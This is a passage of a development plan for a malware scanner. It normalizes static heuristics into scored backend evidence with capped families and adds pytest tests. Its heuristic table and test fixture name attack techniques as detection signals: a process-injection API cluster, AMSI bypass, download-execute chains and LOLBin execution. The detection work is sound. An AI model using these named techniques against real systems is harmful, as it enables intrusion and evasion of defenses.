    "risk_score": analysis.risk_score,
    "risk_factors": analysis.risk_factors,
    "indicators": analysis.indicators,
    "heuristics": [item.__dict__ for item in analysis.heuristics],
    "features": analysis.features,
    "extracted_strings": analysis.extracted_strings[:200],
    ...
}
```

- [ ] **Step 4: Carry heuristics into the final report**

Modify `worker/src/malscan_worker/pipeline.py` inside `_build_analysis_result()`:

```python
"format_analysis": {
    "analyzer": fmt.get("analyzer"),
    "format_type": fmt.get("format_type"),
    "risk_score": fmt_risk_score,
    "risk_factors": fmt.get("risk_factors", []),
    "indicators": fmt_indicators,
    "heuristics": fmt.get("heuristics", []),
    "features": fmt.get("features", {}),
},
...
"archive_extract": {
    **stage_findings.get("archive-extract", {}),
    "heuristics": stage_findings.get("archive-extract", {}).get("heuristics", []),
},
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd worker && poetry run pytest tests/test_format_analysis_stage.py tests/test_pipeline.py -v`

Expected: tests pass and report shape includes heuristic payloads.

---

## Task 8: Normalize heuristics into backend evidence

**Files:**
- Modify: `backend/src/malscan/scoring/adapters.py`
- Test: `backend/tests/test_scoring_adapters.py`

- [ ] **Step 1: Add failing adapter tests for format and archive heuristics**

Append to `backend/tests/test_scoring_adapters.py`:

```python
def test_format_heuristics_are_normalized_before_legacy_indicator_fallback():
    evidence = build_direct_evidence(
        artifact_id="artifact-1",
        stage_findings={
            "clamav": {"infected": False, "threat_name": None},
            "yara": {"matches": []},
            "ioc-extract": {"urls": [], "domains": [], "ips": []},
            "format-analysis": {
                "heuristics": [
                    {
                        "key": "api.process_injection_cluster",
                        "category": "api_pattern",
                        "scope": "pe",
                        "role": "gate_signal",
                        "severity": "high",
                        "confidence": 0.9,
                        "summary": "Process injection API cluster detected",
                        "evidence": {"matched": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]},
                        "tags": ["injection"],
                    }
                ],
                "risk_score": 0,
                "indicators": [],
            },
            "deobfuscation": {},
            "archive-extract": {},
            "sandbox": {},
        },
    )
    ev = next(item for item in evidence if item.kind == "api.process_injection_cluster")
    assert ev.tier == "strong"
    assert ev.cap_group == "heuristic_api"


def test_archive_heuristics_are_normalized_to_archive_cap_group():
    evidence = build_direct_evidence(
        artifact_id="artifact-1",
        stage_findings={
            "clamav": {"infected": False, "threat_name": None},
            "yara": {"matches": []},
            "ioc-extract": {"urls": [], "domains": [], "ips": []},
            "format-analysis": {},
            "deobfuscation": {},
            "archive-extract": {
                "heuristics": [
                    {
                        "key": "archive.executable_concentration",
                        "category": "archive",
                        "scope": "archive",
                        "role": "corroborating",
                        "severity": "medium",
                        "confidence": 0.8,
                        "summary": "Archive contains multiple executable-like members",
                        "evidence": {"executable_member_count": 3},
                        "tags": ["archive"],
                    }
                ]
            },
            "sandbox": {},
        },
    )
    ev = next(item for item in evidence if item.kind == "archive.executable_concentration")
    assert ev.cap_group == "heuristic_archive"
    assert ev.points == 18
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd backend && poetry run pytest tests/test_scoring_adapters.py -v`

Expected: tests fail because archive/format heuristics are ignored.

- [ ] **Step 3: Add heuristic mapping tables and adapter helpers**

Modify `backend/src/malscan/scoring/adapters.py`:

```python
HEURISTIC_MAP = {
    "entropy.high_region_cluster": ("weak", 8, "heuristic_entropy"),
    "packer.known_section_name": ("weak", 10, "heuristic_packer"),
    "packer.sparse_imports_high_entropy": ("medium", 18, "heuristic_packer"),
    "api.process_injection_cluster": ("strong", 40, "heuristic_api"),
    "structure.overlay_anomaly": ("weak", 10, "heuristic_structure"),
    "resource.embedded_executable": ("medium", 22, "heuristic_resource"),
    "script.encoded_command_execution": ("strong", 45, "heuristic_script"),
    "script.download_execute_chain": ("medium", 20, "heuristic_script"),
    "script.amsi_bypass": ("medium", 18, "heuristic_script"),
    "script.long_line_entropy_cluster": ("weak", 8, "heuristic_script"),
    "lolbin.reference_only": ("weak", 6, "heuristic_lolbin"),
    "lolbin.execution_chain": ("medium", 18, "heuristic_lolbin"),
    "archive.password_protected": ("weak", 6, "heuristic_archive"),
    "archive.executable_concentration": ("medium", 18, "heuristic_archive"),
    "archive.path_traversal_member": ("weak", 10, "heuristic_archive"),
    "archive.deep_nesting": ("weak", 8, "heuristic_archive"),
    "office.external_template_execution": ("strong", 45, "heuristic_structure"),
    "office.macro_autoexec_launcher": ("medium", 20, "heuristic_script"),
    "pdf.launch_action_executable": ("strong", 45, "heuristic_structure"),
}


def _append_heuristic_records(records, artifact_id, source, heuristics):
    for hit in heuristics:
        if not isinstance(hit, dict):
            continue
        key = str(hit.get("key", "")).strip()
        if not key:
            continue
        tier, points, cap_group = HEURISTIC_MAP.get(key, ("weak", 5, "heuristic_structure"))
        severity = "high" if tier == "strong" else ("medium" if tier == "medium" else "low")
        _append(
            records,
            source=source,
            kind=key,
            tier=tier,
            severity=severity,
            confidence=float(hit.get("confidence", 0.5) or 0.5),
            points=points,
            cap_group=cap_group,
            artifact_id=artifact_id,
            reason=str(hit.get("summary", key)),
            raw=dict(hit),
        )
```

Call it before legacy indicator fallback:

```python
format_analysis = stage_findings.get("format-analysis")
if isinstance(format_analysis, dict):
    _append_heuristic_records(
        records,
        artifact_id,
        "format-analysis",
        list(format_analysis.get("heuristics", [])),
    )
    _append_format_analysis(records, artifact_id, format_analysis)

archive_extract = stage_findings.get("archive-extract")
if isinstance(archive_extract, dict):
    _append_heuristic_records(
        records,
        artifact_id,
        "archive-extract",
        list(archive_extract.get("heuristics", [])),
    )
```

Inside `_append_format_analysis()`, keep the existing indicator logic but skip support-score emission when `heuristics` is non-empty.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd backend && poetry run pytest tests/test_scoring_adapters.py -v`

Expected: heuristic normalization tests pass and existing adapter tests remain green.

---

## Task 9: Enforce heuristic family caps in the scoring engine

**Files:**
- Modify: `backend/src/malscan/scoring/policy.py`
- Modify: `backend/src/malscan/scoring/engine.py`
- Test: `backend/tests/test_scoring_engine.py`

- [ ] **Step 1: Add failing engine tests for heuristic cap groups**

Append to `backend/tests/test_scoring_engine.py`:

```python
def test_entropy_heuristics_are_capped_by_entropy_family() -> None:
    decision = score_direct_evidence(
        direct_evidence=[
            _ev("format-analysis", "entropy.high_region_cluster", "weak", 8, "heuristic_entropy"),
            _ev("format-analysis", "entropy.high_region_cluster", "weak", 8, "heuristic_entropy"),
            _ev("format-analysis", "entropy.high_region_cluster", "weak", 8, "heuristic_entropy"),
        ]
    )
    assert decision.breakdown.local_score == 12
    assert decision.risk_score == 12


def test_archive_heuristics_are_capped_by_archive_family() -> None:
    decision = score_direct_evidence(
        direct_evidence=[
            _ev("archive-extract", "archive.executable_concentration", "medium", 18, "heuristic_archive"),
            _ev("archive-extract", "archive.path_traversal_member", "weak", 10, "heuristic_archive"),
            _ev("archive-extract", "archive.deep_nesting", "weak", 8, "heuristic_archive"),
        ]
    )
    assert decision.breakdown.local_score == 25
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd backend && poetry run pytest tests/test_scoring_engine.py -v`

Expected: failures because only `ioc_raw` and `deob` are capped today.

- [ ] **Step 3: Make cap enforcement data-driven**

Modify `backend/src/malscan/scoring/policy.py`:

```python
CAP_GROUP_LIMITS = MappingProxyType(
    {
        "ioc_raw": 15,
        "deob": 20,
        "heuristic_entropy": 12,
        "heuristic_packer": 18,
        "heuristic_api": 35,
        "heuristic_structure": 20,
        "heuristic_resource": 30,
        "heuristic_script": 30,
        "heuristic_lolbin": 25,
        "heuristic_archive": 25,
    }
)
```

Modify `backend/src/malscan/scoring/engine.py`:

```python
from malscan.scoring.policy import CAP_GROUP_LIMITS, ...

...

limit = CAP_GROUP_LIMITS.get(ev.cap_group)
if limit is not None:
    remaining = max(0, limit - cap_totals[ev.cap_group])
    effective_points = min(effective_points, remaining)
```

Keep the pure-deob source-family cap after the generic cap enforcement.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd backend && poetry run pytest tests/test_scoring_engine.py -v`

Expected: heuristic cap tests pass and existing gate logic remains green.

---

## Task 10: Verify end-to-end report behavior

**Files:**
- Modify: `worker/tests/test_pipeline.py`
- Modify: `worker/tests/test_format_analysis_stage.py`
- Modify: `backend/tests/test_scoring_adapters.py`

- [ ] **Step 1: Add pipeline report expectations**

Append to `worker/tests/test_pipeline.py` with a format-analysis fixture carrying heuristics:

```python
assert report["results"]["format_analysis"]["heuristics"][0]["key"] == "script.encoded_command_execution"
```

Append archive expectations if the pipeline fixture includes archive output:

```python
assert report["results"]["archive_extract"]["heuristics"][0]["key"] == "archive.executable_concentration"
```

- [ ] **Step 2: Run the targeted suites**

Run:

```bash
cd worker && poetry run pytest tests/test_format_analysis_stage.py tests/test_pipeline.py -v
cd ../backend && poetry run pytest tests/test_scoring_adapters.py tests/test_scoring_engine.py -v
```

Expected: all targeted tests pass.

- [ ] **Step 3: Run the broader static-analysis suite**

Run:

```bash
cd worker && poetry run pytest tests/analyzers tests/heuristics tests/test_format_analysis_stage.py tests/test_pipeline.py tests/test_archive_password.py -v
cd ../backend && poetry run pytest tests/test_scoring_adapters.py tests/test_scoring_engine.py tests/test_api.py -v
```

Expected: all related suites pass with no heuristic-regression failures.

---

## Self-Review Notes

Spec coverage check:

1. entropy analysis: Tasks 2, 3, 9
2. packer indicators: Task 3, Task 8, Task 9
3. suspicious imports / API patterns: Task 3, Task 8
4. file structure anomalies: Tasks 2, 4, 8
5. embedded resource anomalies: Tasks 3, 4, 8
6. script suspicious token patterns: Task 5, Task 8
7. LOLBins clues: Tasks 2, 5, 8
8. archive structure anomalies: Tasks 6, 8, 10

No placeholder terms such as `TODO` or `TBD` are intentionally left in this plan.

---

Plan complete and saved to `docs/superpowers/plans/2026-04-10-static-heuristics-enhancement.md`.
